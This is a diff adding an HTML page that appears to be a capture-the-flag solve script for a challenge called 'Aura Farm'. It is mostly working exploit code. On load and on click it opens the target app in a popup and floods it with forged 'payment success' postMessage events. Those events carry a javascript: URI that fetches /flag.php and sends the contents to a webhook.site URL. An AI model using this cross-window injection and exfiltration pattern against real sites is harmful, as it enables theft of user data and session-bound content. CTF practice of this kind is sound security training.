@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Aura Farm Remote Solve</title>
+  <style>
+    body {
+      font-family: monospace;
+      max-width: 900px;
+      margin: 2rem auto;
+      padding: 0 1rem;
+      line-height: 1.5;
+    }
+
+    code,
+    pre {
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+
+    button {
+      font: inherit;
+      padding: 0.6rem 1rem;
+      cursor: pointer;
+    }
+
+    .status {
+      border: 1px solid #bbb;
+      padding: 1rem;
+      margin-top: 1rem;
+      min-height: 12rem;
+    }
+  </style>
+</head>
+<body>
+  <h1>Aura Farm Remote Solve</h1>
+  <p>
+    This version is meant for the deployed instance from <code>challenge.yml</code>.
+    Set <code>?exfil=...</code> to your webhook, or edit <code>DEFAULT_EXFIL</code> below.
+  </p>
+
+  <button id="launch" type="button">Launch Exploit</button>
+  <pre id="status" class="status"></pre>
+
+  <script>
+    const APP_ORIGIN = 'https://aura-farm.ctf.ingeniums.club';
+    const BOT_ORIGIN = 'https://aura-bot.ctf.ingeniums.club';
+    const DEFAULT_EXFIL = 'https://webhook.site/dec07b72-1348-48be-98ff-097bea86b801';
+
+    const statusEl = document.getElementById('status');
+    const launchButton = document.getElementById('launch');
+
+    function log(line) {
+      statusEl.textContent += `${line}\n`;
+    }
+
+    function buildSink(base, key) {
+      const separator = base.includes('?') ? '&' : '?';
+      return `${base}${separator}${key}=`;
+    }
+
+    function pickExfilBase() {
+      const params = new URLSearchParams(window.location.search);
+      const chosen = params.get('exfil') || DEFAULT_EXFIL;
+      try {
+        const parsed = new URL(chosen, window.location.href);
+        if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
+          return parsed.toString();
+        }
+      } catch (error) {
+        log(`Invalid exfil URL, falling back to default: ${String(error)}`);
+      }
+      return DEFAULT_EXFIL;
+    }
+
+    function buildJavascriptPayload(exfilBase) {
+      const flagSink = buildSink(exfilBase, 'flag');
+      const errorSink = buildSink(exfilBase, 'error');
+      return (
+        "javascript:" +
+        "fetch('/flag.php')" +
+        ".then(r=>r.text())" +
+        `.then(flag=>{const u=${JSON.stringify(flagSink)}+encodeURIComponent(flag);` +
+        "if(window.opener){try{window.opener.location=u;}catch(e){}}" +
+        "location=u;})" +
+        `.catch(err=>{const u=${JSON.stringify(errorSink)}+encodeURIComponent(String(err));` +
+        "if(window.opener){try{window.opener.location=u;}catch(e){}}" +
+        "location=u;})"
+      );
+    }
+
+    function launchExploit() {
+      statusEl.textContent = '';
+
+      const exfilBase = pickExfilBase();
+      const targetUrl = `${APP_ORIGIN}/products.php?cb=${Date.now()}`;
+      const payload = {
+        type: 'payment',
+        status: 'success',
+        path: buildJavascriptPayload(exfilBase),
+      };
+
+      log(`app origin: ${APP_ORIGIN}`);
+      log(`bot endpoint: ${BOT_ORIGIN}/visit`);
+      log(`exfil base: ${exfilBase}`);
+      log(`opening popup: ${targetUrl}`);
+
+      const popup = window.open(targetUrl, 'aurafam_remote_solve');
+      if (!popup) {
+        log('Popup was blocked. Manual testing will need a direct click.');
+        return;
+      }
+
+      let attempts = 0;
+      let timer = null;
+      const maxAttempts = 30;
+      const sendPayload = () => {
+        attempts += 1;
+
+        try {
+          popup.postMessage(payload, APP_ORIGIN);
+          log(`sent forged payment message ${attempts}/${maxAttempts}`);
+        } catch (error) {
+          log(`postMessage failed on attempt ${attempts}: ${String(error)}`);
+        }
+
+        if (attempts >= maxAttempts || popup.closed) {
+          if (timer !== null) {
+            window.clearInterval(timer);
+          }
+          log('finished sending forged messages');
+        }
+      };
+
+      sendPayload();
+      timer = window.setInterval(sendPayload, 50);
+    }
+
+    launchButton.addEventListener('click', launchExploit);
+    window.addEventListener('load', launchExploit, { once: true });
+  </script>
+</body>
+</html>
